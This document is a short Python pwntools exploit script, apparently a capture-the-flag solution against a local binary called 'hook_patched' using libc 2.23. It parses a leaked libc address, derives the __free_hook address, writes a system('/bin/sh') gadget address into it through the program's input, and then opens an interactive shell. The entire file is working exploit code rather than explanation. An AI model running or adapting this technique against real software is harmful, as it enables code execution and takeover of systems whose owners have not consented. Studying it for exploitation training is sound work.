#!/bin/python
from pwn import *
exe = ELF('./hook_patched')
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")
p = process(exe.path)
context.terminal = ['alacritty', '-e']
gdb.attach(p, gdbscript='''
# b*main+182
b*main+149
           ''')
#################exploiting#####################
p.recvuntil(b'stdout: ')
leak_addr = int(p.recvline(6), 16)

system_bin_sh = 0x0000000000400a11
free_hook_addr =  leak_addr +4488
log.info("leak_addr: " + hex(leak_addr))
log.info("free_hook_addr: " + hex(free_hook_addr))
#################send data #####################
payload = p64(free_hook_addr) + p64(system_bin_sh)
p.sendlineafter(b'Size:', b'200')
p.sendafter(b'Data: ',payload) 











##############the end###########################
p.interactive()
